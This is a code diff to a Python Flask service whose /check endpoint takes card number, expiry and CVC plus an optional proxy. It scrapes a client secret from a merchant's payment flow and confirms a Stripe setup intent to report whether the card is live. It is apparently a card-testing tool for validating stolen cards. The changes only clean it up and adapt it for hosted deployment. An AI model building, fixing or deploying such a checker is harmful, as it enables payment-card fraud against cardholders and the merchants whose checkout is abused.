@@ -3,6 +3,7 @@ import requests
 import json
 import urllib3
 
+# Disable SSL warnings (not errors, just the yellow warnings)
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 app = Flask(__name__)
@@ -24,21 +25,22 @@ def build_proxy(proxy_str):
             "http": f"http://{user}:{pw}@{ip}:{port}",
             "https": f"http://{user}:{pw}@{ip}:{port}"
         }
-    except:
+    except Exception:
         return None
 
-@app.route('/check', methods=['GET'])
+@app.route("/check", methods=["GET"])
 def check_card():
     cc = request.args.get("cc")
     proxy_param = request.args.get("proxy")
+
     if not cc:
         return "Declined", 400
 
     try:
         cc, mm, yy, cvc = cc.split("|")
-        if len(yy) == 4:
+        if len(yy) == 4:  # Convert 2028 -> 28
             yy = yy[2:]
-    except:
+    except Exception:
         return "Declined", 400
 
     proxies = build_proxy(proxy_param) if proxy_param else None
@@ -49,11 +51,13 @@ def check_card():
             data={"payment_method": "stripe_cc"},
             headers={"User-Agent": "Mozilla/5.0"},
             proxies=proxies,
-            timeout=30,
-            verify=False
+            timeout=8,
+            verify=True  # safer in serverless
         )
+
+        # Extract secrets
         seti = setup.text.split('{"client_secret":"')[1].split('"}')[0]
-        secret = setup.text.split('{"client_secret":"')[1].split('_secret_')[0]
+        secret = seti.split("_secret_")[0]
 
         confirm = requests.post(
             f"https://api.stripe.com/v1/setup_intents/{secret}/confirm",
@@ -70,8 +74,8 @@ def check_card():
             },
             headers={"User-Agent": "Mozilla/5.0"},
             proxies=proxies,
-            timeout=30,
-            verify=False
+            timeout=8,
+            verify=True
         )
 
         response_data = confirm.json()
@@ -82,5 +86,12 @@ def check_card():
         else:
             return "Declined"
 
-    except:
+    except Exception as e:
+        # Log error to help debug on Vercel
+        print("Error:", str(e))
         return "Declined", 500
+
+
+# Vercel uses wsgi.py, so this block won’t run there
+if __name__ == "__main__":
+    app.run(debug=True)
